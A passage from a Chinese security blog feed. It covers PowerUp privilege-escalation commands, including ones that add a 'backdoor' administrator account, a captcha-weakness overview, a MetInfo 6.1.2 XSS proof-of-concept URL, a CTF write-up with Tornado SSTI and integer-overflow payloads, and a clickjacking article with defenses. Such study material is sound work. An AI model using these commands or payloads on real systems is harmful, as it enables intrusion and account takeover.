-Shellcode ($buf)</code></pre><p>msf反弹成功</p><p>其他扩展可以看先知师傅的</p><p><a href="https://xz.aliyun.com/t/263" target="_blank" rel="external">https://xz.aliyun.com/t/263</a></p><h4 id="绕过杀软执行-invoke-Mimikatz"><a href="#绕过杀软执行-invoke-Mimikatz" class="headerlink" title="绕过杀软执行 invoke-Mimikatz"></a>绕过杀软执行 invoke-Mimikatz</h4><p><a href="https://zhuanlan.zhihu.com/p/24859556" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/24859556</a></p><h3 id="Powerup"><a href="#Powerup" class="headerlink" title="Powerup"></a>Powerup</h3><p>通过脆弱的Windows服务提权；或者通过常见的系统服务，通过其继承的系统权限来完成提权等等，在内核提权行不通的时候，帮助我们寻找服务器脆弱点进而通过脆弱点实现提权的目的。</p><p>加载脚本模块: Import-Module .\PowerUp.ps1</p><p>查看模块的详细说明：Get-Help Invoke-AllChecks -full </p><p>执行所有的脚本来检查: Invoke-AllChecks</p><p>检查当前%PATH%是否存在哪些目录是当前用户可以写入的： Find-PathDLLHijack</p><p>从系统上的applicationHost.config文件恢复加密过的应用池和虚拟目录的密码: Get-ApplicationHost</p><p>检查AlwaysInstallElevated注册表项是否被设置，如果被设置，意味着的MSI文件是以system权限运行的: Get-RegistryAlwaysInstallElevated</p><p>检测Winlogin注册表AutoAdminLogon项有没有被设置，可查询默认的用户名和密码: Get-RegistryAutoLogon</p><p>获取DHCP服务的详细信息: Get-ServiceDetail -ServiceName Dhcp</p><p>检查当前用户能够在哪些服务的目录写入相关联的可执行文件，通过这些文件可达到提权的目的： Get-ServiceFilePermission</p><p>检查所有可用的服务，并尝试对这些打开的服务进行修改，如果可修改，则返回该服务对象：Test-ServiceDaclPermission</p><p>检查服务路径，返回包含空格但是不带引号的服务路径： Get-ServiceUnquoted</p><p>检查几个路径，查找是否存在这些文件，在这些文件里可能包含有部署凭据：Get-UnattendedInstallFile</p><pre><code>c:sysprepsysprep.xmlc:sysprepsysprep.infc:sysprep.infc:windowsPantherUnattended.xmlc:windowsPantherUnattendUnattended.xmlc:windowsPantherUnattend.xmlc:windowsPantherUnattendUnattend.xmlc:windowsSystem32Sysprepunattend.xmlc:windowsSystem32SysprepPantherunattend.xml</code></pre><p>检查开机自启的应用程序路径和注册表键值，返回当前用户可修改的程序路径： Get-ModifiableRegistryAutoRun</p><p>返回当前用户能够修改的计划任务程序的名称和路径： Get-ModifiableScheduledTaskFile</p><p>返回当前服务器上的web.config文件中的数据库连接字符串的明文：Get-Webconfig</p><p>用来通过修改服务添加用户到指定组，并可以通过定制-cmd参数触发添加用户的自定义命令： </p><pre><code>PS C:&gt; Invoke-ServiceAbuse -ServiceName VulnSVC # 添加默认账号PS C:&gt; Invoke-ServiceAbuse -ServiceName VulnSVC -UserName &quot;TESTLABjohn&quot; # 指定添加域账号PS C:&gt; Invoke-ServiceAbuse -ServiceName VulnSVC -UserName backdoor -Password password -LocalGroup &quot;Administrators&quot; # 指定添加用户，用户密码以及添加的用户组。PS C:&gt; Invoke-ServiceAbuse -ServiceName VulnSVC -Command &quot;net ...&quot;# 自定义执行命令</code></pre><p>恢复服务的可执行文件到原始目录：</p><pre><code>Restore-ServiceBinary -ServiceName VulnSVC</code></pre><p>检查某个用户是否在一个服务有自由访问控制的权限，返回true或false：Restore-ServiceBinary -ServiceName VulnSVC</p><p>输出一个自定义命令并且能够自删除的bat文件到$env:Tempdebug.bat，并输出一个能够启动这个bat文件的dll：Write-HijackDll</p><p>预编译C#服务的可执行文件。默认创建一个默认管理员账号。可通过Command定制自己的命令：</p><pre><code>PS C:&gt;Write-ServiceBinary -ServiceName VulnSVC # 添加默认账号PS C:&gt;Write-ServiceBinary -ServiceName VulnSVC -UserName &quot;TESTLABjohn&quot; # 指定添加域账号PS C:&gt;Write-ServiceBinary-ServiceName VulnSVC -UserName backdoor -Password Password123! # 指定添加用户，用户密码以及添加的用户组PS C:&gt; Write-ServiceBinary -ServiceName VulnSVC -Command &quot;net ...&quot; # 自定义执行命令</code></pre><p>通过Write-ServiceBinary写一个C#的服务用来添加用户：</p><pre><code>PS C:&gt; Install-ServiceBinary -ServiceName DHCPPS C:&gt; Install-ServiceBinary -ServiceName VulnSVC -UserName &quot;TESTLABjohn&quot;PS C:&gt;Install-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123!PS C:&gt; Install-ServiceBinary -ServiceName VulnSVC -Command &quot;net ...&quot;</code></pre><h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><p>篇幅过程细读此两篇文章</p><p><a href="https://www.anquanke.com/post/id/87328" target="_blank" rel="external">https://www.anquanke.com/post/id/87328</a></p><p><a href="https://www.anquanke.com/post/id/87333" target="_blank" rel="external">https://www.anquanke.com/post/id/87333</a></p><p>这里学到的tips在于：在内网抓取的密码比较多又乱的时候，可以通过命令来正对hash/plaintext进行排列，增加，删除，导出等操作，这里我们将凭证存储导出为，输入creds export 目录/xx.csv命令。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>读完此书，学到了很多对于后渗透阶段怎么进行和优化，对于安全，一定不能忘却初心。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文首发于&lt;a href=&quot;https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;amp;tid=45429&amp;amp;highlight=%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98
      
    
    </summary>
    
      <category term="读书摘要" scheme="http://Bigbroke.com/categories/%E8%AF%BB%E4%B9%A6%E6%91%98%E8%A6%81/"/>
    
    
      <category term="读书摘要" scheme="http://Bigbroke.com/tags/%E8%AF%BB%E4%B9%A6%E6%91%98%E8%A6%81/"/>
    
  </entry>
  
  <entry>
    <title>验证码相关安全问题</title>
    <link href="http://Bigbroke.com/archis/b46a6d47/"/>
    <id>http://Bigbroke.com/archis/b46a6d47/</id>
    <published>2018-10-23T15:05:15.000Z</published>
    <updated>2018-11-02T13:52:18.469Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-乌云知识库"><a href="#0x00-乌云知识库" class="headerlink" title="0x00 乌云知识库:"></a>0x00 乌云知识库:</h2><ul><li><a href="http://drops.ichenfei.com/web-5459.html" target="_blank" rel="external">验证码安全问题汇总</a></li><li><a href="http://drops.ichenfei.com/tips-141.html" target="_blank" rel="external">聊一聊随机数安全</a></li><li><a href="http://drops.ichenfei.com/web-5048.html" target="_blank" rel="external">密码找回逻辑漏洞总结</a></li><li><a href="http://drops.ichenfei.com/papers-2035.html" target="_blank" rel="external">一些常见的重置密码漏洞分析整理</a></li></ul><h2 id="0x01-其他相关文章"><a href="#0x01-其他相关文章" class="headerlink" title="0x01 其他相关文章"></a>0x01 其他相关文章</h2><ul><li><a href="http://www.cnbraid.com/2016/captcha.html" target="_blank" rel="external">【安全加固】 验证码的实现原理和安全问题汇总</a></li><li><a href="http://blog.csdn.net/niaonao/article/details/51112686" target="_blank" rel="external">验证码原理分析及实现</a></li><li><a href="https://lizonghang.github.io/2016/07/10/%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%AD%97%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E5%8E%9F%E7%90%86%E3%80%81%E7%94%9F%E6%88%90%E5%92%8C%E7%A0%B4%E8%A7%A3/" target="_blank" rel="external">随机数字图片验证码的原理、生成和破解</a></li><li><a href="http://www.lijiejie.com/safe-issues-of-captcha/" target="_blank" rel="external">图形验证码的常见安全问题</a></li></ul><h2 id="0x02-乌云相关案例"><a href="#0x02-乌云相关案例" class="headerlink" title="0x02 乌云相关案例"></a>0x02 乌云相关案例</h2><ul><li><a href="http://wy.ichenfei.com/searchbug.php?q=%E9%AA%8C%E8%AF%81%E7%A0%81" target="_blank" rel="external">http://wy.ichenfei.com/searchbug.php?q=验证码</a>  <!-- - [http://es.ichenfei.com:8000/wysearch/?q=验证码](http://es.ichenfei.com:8000/wysearch/?q=验证码) --></li></ul><h2 id="0x03-验证码实现原理"><a href="#0x03-验证码实现原理" class="headerlink" title="0x03 验证码实现原理"></a>0x03 验证码实现原理</h2><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201810240004_376.jpg" alt=""></p><ol><li>客户端发起一个请求；</li><li>服务端响应并创建一个新的SessionID同时生成一个随机验证码；</li><li>服务端将验证码和SessionID一并返回给客户端；</li><li>客户端提交验证码连同SessionID给服务端；</li><li>服务端验证验证码同时销毁当前Session中的验证码，返回给客户端结果。</li></ol><p>根据上面的实现流程，可以从四个方面入手，<strong>客户端问题</strong>、<strong>服务端问题</strong>、<strong>验证码本身问题</strong>,还有一个<strong>验证码流程设计</strong>问题。</p><h2 id="0x04-客户端问题"><a href="#0x04-客户端问题" class="headerlink" title="0x04 客户端问题"></a>0x04 客户端问题</h2><ul><li>客户端生成验证码<ul><li>验证码由客户端js生成并且仅仅在客户端用js验证</li></ul></li><li>验证码输出客户端<ul><li>输出在html中（神一样的程序员）</li></ul></li><li>验证码输出在cookie中，这个在乌云中案例也是比较多的。</li></ul><h2 id="0x05-服务端问题"><a href="#0x05-服务端问题" class="headerlink" title="0x05 服务端问题"></a>0x05 服务端问题</h2><ul><li>验证码不过期，没有及时销毁会话导致验证码复用<ul><li>这个是最常见的，乌云上面有大量的案例。</li></ul></li><li>没有进行非空判断<ul><li>很多时候，我们会遗留掉了验证过程中验证码为空的情况</li><li>比如去掉cookie中的某些值或者请求中验证码参数</li></ul></li><li>产生的验证码问题集内的答案非常有限</li></ul><h2 id="0x06-其他类型验证码绕过"><a href="#0x06-其他类型验证码绕过" class="headerlink" title="0x06 其他类型验证码绕过"></a>0x06 其他类型验证码绕过</h2><p>pkav http fuzzer工具可以简单绕过数字型验证码</p><p>基于机器学习识别验证码</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-乌云知识库&quot;&gt;&lt;a href=&quot;#0x00-乌云知识库&quot; class=&quot;headerlink&quot; title=&quot;0x00 乌云知识库:&quot;&gt;&lt;/a&gt;0x00 乌云知识库:&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://drops.ichenfei
      
    
    </summary>
    
      <category term="WebSecurity" scheme="http://Bigbroke.com/categories/WebSecurity/"/>
    
    
      <category term="web" scheme="http://Bigbroke.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Xss in MetInfo V6.1.2</title>
    <link href="http://Bigbroke.com/archis/a5c61176/"/>
    <id>http://Bigbroke.com/archis/a5c61176/</id>
    <published>2018-10-15T18:16:08.000Z</published>
    <updated>2018-11-02T13:52:15.846Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Xss-in-MetInfo-V6-1-2"><a href="#Xss-in-MetInfo-V6-1-2" class="headerlink" title="Xss in MetInfo V6.1.2"></a>Xss in MetInfo V6.1.2</h1><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>The vulnerability exists in the MetInfo6.1.2/admin/index.php page. Due to the lazy filtering of the parameter anyid, the XSS vulnerability is caused.</p><h2 id="Founction"><a href="#Founction" class="headerlink" title="Founction"></a>Founction</h2><p>The affected page located in admin’s management page:MetInfo6.1.2\admin\</p><h2 id="Reappearance"><a href="#Reappearance" class="headerlink" title="Reappearance"></a>Reappearance</h2><p>To build a website locally, first login to the website background: <a href="http://localhost/MetInfo6.1.2/admin/" target="_blank" rel="external">http://localhost/MetInfo6.1.2/admin/</a>. After the login is successful, construct the payload:</p><p>Xss vulnerability exists</p><pre><code>http://localhost:9096/MetInfo6.1.2/admin/index.php?lang=cn&amp;anyid=47oaflb%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3emwq3k&amp;n=admin&amp;c=admin_admin&amp;a=doadd</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201810160210_976.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Xss-in-MetInfo-V6-1-2&quot;&gt;&lt;a href=&quot;#Xss-in-MetInfo-V6-1-2&quot; class=&quot;headerlink&quot; title=&quot;Xss in MetInfo V6.1.2&quot;&gt;&lt;/a&gt;Xss in MetInfo V6.1.2&lt;/
      
    
    </summary>
    
      <category term="代码审计" scheme="http://Bigbroke.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="cve" scheme="http://Bigbroke.com/tags/cve/"/>
    
  </entry>
  
  <entry>
    <title>护网杯wp</title>
    <link href="http://Bigbroke.com/archis/173905c2/"/>
    <id>http://Bigbroke.com/archis/173905c2/</id>
    <published>2018-10-13T15:53:02.000Z</published>
    <updated>2018-12-03T11:22:17.482Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy tornado"></a>easy tornado</h3><p>进入首页，看到文件列表。</p><p><a href="http://49.4.94.186:31331/" target="_blank" rel="external">http://49.4.94.186:31331/</a></p><p>随便点一个，可以读取文件内容，看到url里有两个参数，一个是文件名，另一个是签名。</p><p>根据 hint.txt ， 签名是 cookie_secret + 文件名 的 md5</p><pre><code>hint.txtmd5(cookie_secret + md5(filename))</code></pre><p><a href="http://49.4.94.186:31331/file?filename=Orz.txt&amp;signature=25d5cc7447f6e6a5785004b0a3362d6c" target="_blank" rel="external">http://49.4.94.186:31331/file?filename=Orz.txt&amp;signature=25d5cc7447f6e6a5785004b0a3362d6c</a></p><p>通过 FUZZ 参数，发现新的路由，即报错页面。</p><p><a href="http://49.4.94.186:31331/error?msg=%E7%AD%BE%E5%90%8D%E9%94%99%E8%AF%AF" target="_blank" rel="external">http://49.4.94.186:31331/error?msg=%E7%AD%BE%E5%90%8D%E9%94%99%E8%AF%AF</a></p><p>看到参数的 <code>签名错误</code> 被输出到页面里，应该是 SSTI。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201811020000.png" alt=""></p><p><a href="http://blog.51cto.com/wengmengkai/1844886" target="_blank" rel="external">tornado—web框架基础入门</a> 通过这个进行快速学习tornado的开发</p><p><a href="http://www.tornadoweb.org/en/stable/" target="_blank" rel="external">tornado文档</a> 通过阅读文档快速掌握对象</p><p>安装:</p><pre><code>pip install tornado</code></pre><p>官方demo</p><pre><code class="python">import tornado.ioloopimport tornado.web# import uimodules as md# import uimethods as mtclass MainHandler(tornado.web.RequestHandler):    def get(self):        self.write(&quot;Hello, world&quot;)settings = {    &#39;template_path&#39;: &#39;views&#39;,        # html文件    &#39;static_path&#39;: &#39;statics&#39;,        # 静态文件（css,js,img）    &#39;static_url_prefix&#39;: &#39;/statics/&#39;,        # 静态文件前缀    &#39;cookie_secret&#39;: &#39;suoning&#39;,        # cookie自定义字符串加盐    # &#39;xsrf_cookies&#39;: True,         # 防止跨站伪造    # &#39;ui_methods&#39;: mt,           # 自定义UIMethod函数    # &#39;ui_modules&#39;: md,           # 自定义UIModule类}application = tornado.web.Application([    (r&quot;/&quot;, MainHandler),], **settings)if __name__ == &quot;__main__&quot;:    application.listen(8888)    tornado.ioloop.IOLoop.instance().start()</code></pre><p>通过<code>application = tornado.web.Application([(r&quot;/&quot;, MainHandler),], **settings)</code></p><p>很明显可以知道 cookie_secret 在RequestHandler这个对象里面</p><p>然后根据<a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="external">Tornado小记 – 模板中的Handler</a></p><blockquote><p>handler 指向RequestHandler</p><p>而RequestHandler.settings又指向self.application.settings</p><p>所有handler.settings就指向RequestHandler.application.settings了！</p></blockquote><p>就知道怎么通过模版注入 </p><p>模版注入绕过:<a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="external">Flask/Jinja2模板注入中的一些绕过姿势</a></p><p>里面的payload 基本都包含 () 很明显题目过滤了 只保留了. 所以通过上面别名的方法来获得cookie_secret</p><p>可以通过这个 msg= 直接读出 tornado 的配置。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/jl6Wwoc.png" alt=""></p><p>找到了 cookie_secret，根据 hint，构造 url</p><p>/fllllllllllag</p><p>{BVt!-e%cqXs<a href="&#109;&#x61;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x26;&#108;&#110;&#x29;&#x24;&#55;&#95;&#120;&#73;&#64;&#x77;&#x4a;&#x30;&#x50;&#65;&#94;&#x39;&#81;&#49;&#35;&#x38;&#x3f;&#107;&#x68;&#x6a;&#40;&#x34;&#x61;&#x6f;&#50;&#117;&#114;&#x43;&#x62;&#76;&#x33;&#72;&#69;&#x7e;&#46;&#71;&#x70;&#122;&#70;&#x66;">&#x26;&#108;&#110;&#x29;&#x24;&#55;&#95;&#120;&#73;&#64;&#x77;&#x4a;&#x30;&#x50;&#65;&#94;&#x39;&#81;&#49;&#35;&#x38;&#x3f;&#107;&#x68;&#x6a;&#40;&#x34;&#x61;&#x6f;&#50;&#117;&#114;&#x43;&#x62;&#76;&#x33;&#72;&#69;&#x7e;&#46;&#71;&#x70;&#122;&#70;&#x66;</a>[YKSg</p><pre><code class="php">&lt;?php$str = &quot;/fllllllllllag&quot;;$a=md5($str);$str2 = &quot;{BVt!-e%cqXs&lt;&amp;ln)$7_xI@wJ0PA^9Q1#8?khj(4ao2urCbL3HE~.GpzFf&gt;[YKSg&quot;;$str3=$str2.$a;echo md5($str3);?&gt;</code></pre><p>2ad507bc2e8b59cce2e4147b0bfa169f</p><p><a href="http://49.4.94.186:31331/file?filename=/fllllllllllag&amp;signature=2ad507bc2e8b59cce2e4147b0bfa169f" target="_blank" rel="external">http://49.4.94.186:31331/file?filename=/fllllllllllag&amp;signature=2ad507bc2e8b59cce2e4147b0bfa169f</a></p><p>flag{fd29ee3314ce32fedce028ca753fb68a}</p><p><a href="http://49.4.78.81:30980/file?filename=/fllllllllllag&amp;signature=7bae09c2c6e2f6aa34df7dbee23db960" target="_blank" rel="external">http://49.4.78.81:30980/file?filename=/fllllllllllag&amp;signature=7bae09c2c6e2f6aa34df7dbee23db960</a></p><h3 id="LTSHOP"><a href="#LTSHOP" class="headerlink" title="LTSHOP"></a>LTSHOP</h3><p>本题的考点在于条件竞争以及整数的溢出问题</p><p>通过多线程发包的方式使得购买到 5 个以上的大辣条</p><p>可以使用burp抓包，发送到intruder</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201810181352_259.png" alt=""></p><p>设线程大一点</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201810181402_632.png" alt=""></p><p>start stack</p><p>得到10个大辣条越换两个辣条之王</p><p>抓包发现cookie有go_iris 猜测是go语言数据类型溢出</p><p>由于go使用强类型语言，猜测是整数溢出。 最后测试出是unsigned __int64,而uint64范围为18446744073709551615， 5个大辣条换一个辣条之王。</p><p>这里遇到了很大坑一开始我们一直用18446744073709551616，然后比赛完才发现要除以为除以5，所以最后num=3689348814741910324，那么要花费18446744073709551620个大辣条，超出uint64范围转换为5。</p><p>payload：</p><p>num=3689348814741910324</p><h3 id="easy-laravel"><a href="#easy-laravel" class="headerlink" title="easy_laravel"></a>easy_laravel</h3><p><a href="https://qvq.im/post/%E6%8A%A4%E7%BD%91%E6%9D%AF2018%20easy_laravel%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95" target="_blank" rel="external">https://qvq.im/post/%E6%8A%A4%E7%BD%91%E6%9D%AF2018%20easy_laravel%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95</a></p><p><a href="https://www.anquanke.com/post/id/161849" target="_blank" rel="external">https://www.anquanke.com/post/id/161849</a></p><p><code>ez_laravel</code>给了docker镜像，详细分析和复现下，确实是一道好题，膜4uuu师傅。</p><p><a href="https://github.com/sco4x0/huwangbei2018_easy_laravel" target="_blank" rel="external">https://github.com/sco4x0/huwangbei2018_easy_laravel</a></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="迟来的签到题"><a href="#迟来的签到题" class="headerlink" title="迟来的签到题"></a>迟来的签到题</h3><pre><code class="python">import base64tmp=&quot;&quot;string = &quot;AAoHAR1TJ1clUFYjVSRRV1cnIiUiV1BeUFNeIlBXI1BVI1UlUBs=&quot;string2 = base64.b64decode(string)print(string2)for i in range(1,256):    for j in string2:        tmp = tmp + chr(ord(j) ^ i)    print(tmp)    tmp=&quot;&quot;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h2&gt;&lt;h3 id=&quot;easy-tornado&quot;&gt;&lt;a href=&quot;#easy-tornado&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="CTF" scheme="http://Bigbroke.com/categories/CTF/"/>
    
    
      <category term="ctf" scheme="http://Bigbroke.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>web漏洞挖掘之点击劫持漏洞</title>
    <link href="http://Bigbroke.com/archis/95d370e7/"/>
    <id>http://Bigbroke.com/archis/95d370e7/</id>
    <published>2018-10-11T06:13:02.000Z</published>
    <updated>2018-11-02T13:52:15.724Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web漏洞挖掘之点击劫持漏洞"><a href="#web漏洞挖掘之点击劫持漏洞" class="headerlink" title="web漏洞挖掘之点击劫持漏洞"></a>web漏洞挖掘之点击劫持漏洞</h1><h2 id="0x00-点击劫持的概念"><a href="#0x00-点击劫持的概念" class="headerlink" title="0x00 点击劫持的概念"></a>0x00 点击劫持的概念</h2><p>点击劫持clickjacking，也叫UI-覆盖攻击（UI redress attack）；最早是在2008年，由互联网安全专家罗伯特·汉森和耶利米·格劳斯曼首创。</p><p>百度百科上对其的定义如下： 它是通过覆盖不可见的框架误导受害者点击。 虽然受害者点击的是他所看到的网页，但其实他所点击的是被黑客精心构建的另一个置于原网页上面的透明页面。 这种攻击利用了HTML中<code>&lt;iframe&gt;</code>标签的透明属性  </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112329_760.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112329_533.png" alt=""></p><p>图片中，都是进行了iframe嵌套，构成一个页面 来诱使用户进行点击。 以上就是点击劫持的一个基本概念 </p><h2 id="0x01点击劫持攻击的原理"><a href="#0x01点击劫持攻击的原理" class="headerlink" title="0x01点击劫持攻击的原理"></a>0x01点击劫持攻击的原理</h2><p>点击劫持实际上是一种视觉上的欺骗手段，攻击者通过利用一个透明的、不可见的iframe，覆盖在某网页上，然后诱导用户在该网页上进行点击等操作，而此时用户在不知情的情况下点击了透明的iframe页面 。攻击者通过调整iframe页面的位置，可以诱使用户恰好点击在iframe页面的一些功能性按钮上。 如使用css调整图片大小位置，通过设置opacity参数调整元素透明度等；目的都是让用户就无法看到含恶意代码的目标网页。 </p><p>这是点击劫持的原理，关键在于构造不可见的透明iframe来进行利用； </p><h2 id="0x02-挖掘的思路"><a href="#0x02-挖掘的思路" class="headerlink" title="0x02 挖掘的思路"></a>0x02 挖掘的思路</h2><p>1.我们只需要创建一个iframe的页面嵌套就可以简单的测试 </p><p>如果目标应用支持iframe进行页面嵌套，那么基本断定网站存在点击劫持攻击漏洞 比如<code>&lt;iframe src=&quot;http://target.com&quot;/&gt;</code> ，假设该页面上显示hello world 如果通过iframe嵌套后能显示为 </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112339_70.png" alt=""></p><p>基本就能确定存在点击劫持风险 </p><p>2.通过目标的HTTP响应头是否设置好了X-Frame-Options字段，是否有JavaScript的Frame Busting机制，也可以进行判断 ，比如在用常见的WVS进行网站扫描时，会经常看到这样的信息： </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112340_436.jpg" alt=""></p><p>这就是通过判断是否存在X-Frame-Options响应头来处理 其他辅助工具进行clickjacking漏洞探测的时候，也都基本上基于以上情况进行处理 </p><h2 id="0x03-举列子"><a href="#0x03-举列子" class="headerlink" title="0x03 举列子"></a>0x03 举列子</h2><p>这两处代码截图是github上的clickjacking扫描的代码，可以参考：<a href="qq://txfile/#" target="_blank" rel="external">https://github.com/D4Vinci/Clickjacking-Tester</a> <a href="qq://txfile/#" target="_blank" rel="external">https://github.com/LTF1633242320/D-TECT</a> </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112341_651.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112341_810.png" alt=""></p><p>点击劫持 主要是靠点击，也有通过拖拽进行劫持实现的 </p><p>这种点击劫持的案例，比较知名的包括：Facebook 的‘likejacking’攻击、Adobe Flash Player 网站漏洞、Twitter 的 Don’t click 攻击、谷歌账户点击劫持攻击等 </p><p>在诸多点击劫持案例中，最为经典的案例是攻击者通过flash构造出点击劫持，最终控制用户电脑摄像头事件; </p><p>首先，攻击者构造一个flash小游戏，并贴心逼真地显示了游戏得分以及游戏耗时，诱导用户试玩；在试玩过程中引导用户点击不停变换位置的“click”按钮， 而其实在游戏界面中隐藏了一个看不见的iframe </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112354_232.png" alt=""></p><p>攻击通过诱导用户使用鼠标点击看似随意的位置，来完成较为复杂的操作。 </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112355_209.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112356_575.png" alt=""></p><p>并最终开启了用户的摄像头 </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112356_551.png" alt=""></p><p>某浪博客关注点击劫持 </p><p>在新浪博客的“加关注”处： </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112356_303.jpg" alt=""></p><p>通过简单构造的html页面，如下， </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112357_673.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112357_64.png" alt=""></p><p>通过构造iframe 从而进行博客关注数量的刷新 </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112357_869.jpg" alt=""></p><p>当然可以再对html页面进行精心美化调整，从而大面积进行点击劫持攻击的实施。 分享一个github上的类似开启摄像头的一个demo，可以在做安全意识培训是当演示了<a href="qq://txfile/#" target="_blank" rel="external">https://github.com/thomaspatzke/Clickjacking-Exploit</a></p><p>低版本IE时代的东西了吧 用浏览器插件 </p><p>html5可以直接调用摄像头  前段时间有朋友搞得一个xss用HTML5调用摄像头，直接可以看到使用者照片 </p><h2 id="0x04-点击劫持与其他漏洞结合效果"><a href="#0x04-点击劫持与其他漏洞结合效果" class="headerlink" title="0x04 点击劫持与其他漏洞结合效果"></a>0x04 点击劫持与其他漏洞结合效果</h2><p>可以配合CSRF  </p><p>反射型xss可以和点击劫持一起形成差不多储存型xss的效果</p><p>反射XSS直接利用需要对方点击，如果直接把包含反射XSS的链接发送给受害者，比较唐突难以利用，所以如果将点击劫持与反射xss结合起来，利用iframe嵌套诱导，也就基本能达到存储XSS的效果 </p><h2 id="0x05-点击劫持漏洞的防御方法"><a href="#0x05-点击劫持漏洞的防御方法" class="headerlink" title="0x05 点击劫持漏洞的防御方法"></a>0x05 点击劫持漏洞的防御方法</h2><p>点击劫持漏洞的防御 主要是两种，一个是通过Frame busting防御、一种是通过添加X-Frame-Options属性进行防御 </p><p>frame busting防御，通过js代码禁止iframe的嵌套，如判断顶层窗口跳转： </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112359_756.png" alt=""></p><p>下面是一些常见Frame busting： </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112359_295.png" alt=""></p><p>但frame busting存在被绕过的可能，如多层iframe嵌套等； 在HTML 5中iframe的sandbox属性、IE中iframe的security属性等，都可以限制iframe页面中的脚本执行，从而可以使得frame busting失效 ,比如在html5中进行绕过：设置<iframe>属性：sandbox </iframe></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808120000_760.png" alt=""></p><p>当sandbox 仅设置为allow-forms时，js是不被执行的 </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808120000_246.png" alt=""></p><p>设置<iframe>属性：security；当security设置为restricted后，frame中的脚本也将不能执行；但仅限于IE ，如此一来，由于无法执行js脚本，则通过JS来判断顶层跳转将失败 </iframe></p><p>第二种方式，设置X-Frame-Options属性； X-Frame-Options是一个微软提出的一个HTTP响应头；用来给浏览器指示允许一个页面可否在 <frame>, <iframe> 或者 <object> 中展现的标记。 </object></iframe></p><p>通过设置X-Frame-Options 阻止站点内的页面被其他页面嵌入从而防止点击劫持；这是目前处理点击劫持攻击的最优且最可靠的手段； X-Frame-Options 的三个可选值：  Ø    DENY  Ø    SAMEORIGIN  Ø    ALLOW-FROM origin </p><p>以下是这三个可选值的表义： 如果设置为 DENY，表示该页面不允许在 frame 中展示，即便是在同源域名的页面中嵌套也不允许； </p><p>如果设置为 SAMEORIGIN，表示该页面可以在同源域名页面的 frame 中嵌套展示； 如果设置为 ALLOW-FROM，表示该页面可以在指定来源的 frame 中嵌套展示（origin为允许frame加载的页面地址）； </p><p>在各个平台中间件中X-Frame-Options的配置不一样， 在IIS环境中，在web站点的web.config中配置。 </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808120001_277.png" alt=""></p><p>在apache中： 先开启mod_<a href="qq://txfile/#" target="_blank" 